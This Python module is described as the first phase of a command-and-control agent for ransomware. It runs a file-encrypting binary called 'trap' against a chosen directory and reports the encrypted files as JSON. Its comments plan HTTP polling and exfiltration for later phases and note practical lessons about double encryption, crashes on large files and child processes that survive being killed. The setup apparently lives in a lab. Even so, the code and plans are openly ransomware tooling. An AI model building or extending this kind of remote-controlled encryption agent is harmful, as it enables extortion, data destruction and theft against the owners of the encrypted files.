"""Phase 1 runner: drive the trap binary from Python, return structured results.

This module is the embryo of the C2 agent (Architecture B methodology).
Everything built in later phases (HTTP polling, job state, exfiltration)
wraps around run_trap() — the function signature and return shape are frozen
from this point on.
"""

# ============================================================================
# PLAIN-LANGUAGE SUMMARY — WHAT PHASE 1 DID AND WHAT THIS FILE ACHIEVES
# ============================================================================
#
# THE BIG PICTURE
#   We are building a remote-control system (a "C2") around an existing
#   program called "trap" that encrypts/decrypts files. Phase 1 is the first
#   brick of that system: a small Python file that can RUN the trap program
#   and REPORT what happened in a clean, structured way (JSON) instead of
#   raw text.
#
# WHAT THIS FILE DOES, STEP BY STEP
#   1. It finds trap's "home" folder (the folder where trap's keys live).
#      Paths are calculated from THIS FILE's location, never from wherever
#      the terminal happens to be — so it works the same no matter where
#      you start it from.
#   2. run_trap() runs the trap program as a child process with three
#      important details:
#        - the command is passed as a LIST of arguments (never one shell
#          string), so file names with spaces survive intact;
#        - the child is started with its working directory set to trap's
#          home folder, because trap looks for its keys relative to where
#          it runs from (get this wrong and keys appear in random places);
#        - a timeout is set, so a stuck run can never block us forever.
#   3. It reads the child's two output channels and sorts the information:
#        - stdout: lines like "Encrypted: /some/path" — these are counted
#          and collected, because they are the ONLY reliable per-file
#          progress signal;
#        - stderr: error messages, kept as a list;
#        - the exit code, kept separately, because it means something
#          different from the errors (1 = failed to start, 0 = the walk
#          finished — even if every file failed).
#   4. It returns all of that as one Python dictionary. Later phases will
#      send this dictionary over HTTP to the controller.
#
# WHAT PHASE 1 EXPERIMENTS TAUGHT US (and why the code looks like this)
#   - trap prints file paths wrapped in double quotes, so we strip them.
#   - Re-running encrypt on an encrypted folder double-encrypts it, and the
#     exit code stays 0 — so the exit code alone can NEVER be trusted;
#     you must look at "processed" / "errors".
#   - Decrypting a folder of plain (not encrypted) files silently skips
#     everything with exit code 0 — again, silent is not the same as success.
#   - Files of 2 GB or more crash trap (it uses 32-bit integers internally);
#     the child dies with exit code -6. Watch for that signature.
#   - Killing this Python wrapper does NOT kill the trap child process —
#     that will matter when we add job cancellation in a later phase.
#
# BOTTOM LINE
#   Phase 1 proves: Python can run trap safely, keep its keys in the right
#   place, and turn trap's messy text output into structured data. From here
#   on, this file does not change — Phase 2+ only build around it.
# ============================================================================

import argparse
import json
import subprocess
from pathlib import Path

# Resolve paths relative to this file, not the caller's CWD. The agent will be
# started from cron/services/random directories; anchoring to the file location
# keeps trap's home (and its CWD-relative keys) deterministic.
C2_ROOT = Path(__file__).resolve().parent.parent          # ransomware/
TRAP_HOME = C2_ROOT / "lab" / "opt-trap"                  # simulated /opt/trap
TRAP_BIN = TRAP_HOME / "trap"


def run_trap(action: str, target_dir: str, timeout: int = 600) -> dict:
    """Run trap <action> <target_dir> and parse its output into a summary.

    target_dir should be ABSOLUTE: trap resolves it relative to its own CWD
    (TRAP_HOME), not ours.
    """
    proc = subprocess.run(
        [str(TRAP_BIN), action, target_dir],   # argv list, never a shell string
        cwd=TRAP_HOME,                          # the CWD rule from Part 1 section 2
        capture_output=True, text=True,
        timeout=timeout,
    )
    processed = [
        line.split(": ", 1)[1].strip('"')   # fs::path streams paths with quotes
        for line in proc.stdout.splitlines()
        if line.startswith(("Encrypted: ", "Decrypted: "))
    ]
    return {
        "action": action,
        "target_dir": target_dir,
        "exit_code": proc.returncode,           # 1 = startup failure, 0 = walk finished
        "processed": processed,                 # paths from stdout — a lower bound
        "processed_count": len(processed),
        "errors": proc.stderr.splitlines(),
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="Run trap and emit a JSON summary.")
    parser.add_argument("action", choices=["encrypt", "decrypt"])
    parser.add_argument("target_dir", help="absolute path (trap resolves it relative to its own CWD)")
    parser.add_argument("--timeout", type=int, default=600)
    args = parser.parse_args()
    print(json.dumps(run_trap(args.action, args.target_dir, args.timeout), indent=2))


if __name__ == "__main__":
    main()
